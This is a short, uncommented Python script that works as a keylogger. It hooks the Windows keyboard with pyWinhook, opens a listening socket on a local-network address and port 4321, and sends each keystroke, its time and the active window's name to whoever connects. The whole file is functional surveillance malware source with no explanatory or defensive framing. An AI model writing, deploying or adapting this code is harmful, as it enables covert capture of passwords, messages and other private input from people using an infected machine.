import pyWinhook,socket,win32gui,socket,datetime
with socket.socket() as OpenSocket:
    OpenSocket.bind(('192.168.1.33', 4321))
    OpenSocket.listen(1)
    C,A = OpenSocket.accept()
def onclick(e):
    C.send(f'{e.GetKey()}\t{e.Time}\t{e.WindowName}\t{datetime.datetime.now()}'.encode())
    return 1
mng = pyWinhook.HookManager()
mng.HookKeyboard()
mng.SubscribeKeyDown(onclick)
win32gui.PumpMessages()